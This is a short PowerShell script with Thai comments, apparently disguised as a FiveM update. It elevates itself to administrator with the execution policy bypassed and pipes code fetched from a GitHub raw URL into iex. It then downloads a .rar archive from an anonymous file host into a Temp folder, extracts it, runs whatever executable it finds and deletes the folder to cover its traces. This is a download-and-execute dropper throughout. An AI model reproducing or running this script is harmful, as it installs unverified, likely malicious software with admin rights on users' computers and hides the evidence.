# 1. ขอสิทธิ์ Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/nphathrbuychi-boop/top1/refs/heads/main/Cmdfivem').Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าพาธ (ใช้โฟลเดอร์ Temp)
$url = "https://files.catbox.moe/efrw7v.rar"
$tempDir = "$env:TEMP\FiveM_Update"
$rarFile = "$tempDir\data.rar"

# สร้างโฟลเดอร์
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir | Out-Null

# 3. ดาวน์โหลด
Write-Host "[*] Downloading file..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $rarFile -UseBasicParsing

# 4. แตกไฟล์ (ใช้ tar แทน Expand-Archive เพื่อรองรับ .rar)
Write-Host "[*] Extracting files..." -ForegroundColor Cyan
cd $tempDir
tar -xf $rarFile

# 5. รันไฟล์ .exe
Write-Host "[*] Running application..." -ForegroundColor Green
$exe = Get-ChildItem -Filter "*.exe" | Select-Object -First 1
if ($exe) {
    Start-Process -FilePath $exe.FullName -Wait
}

# 6. ลบไฟล์ทิ้ง
Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
cd $env:TEMP
Remove-Item -Path $tempDir -Recurse -Force

Write-Host "[+] Done!" -ForegroundColor White
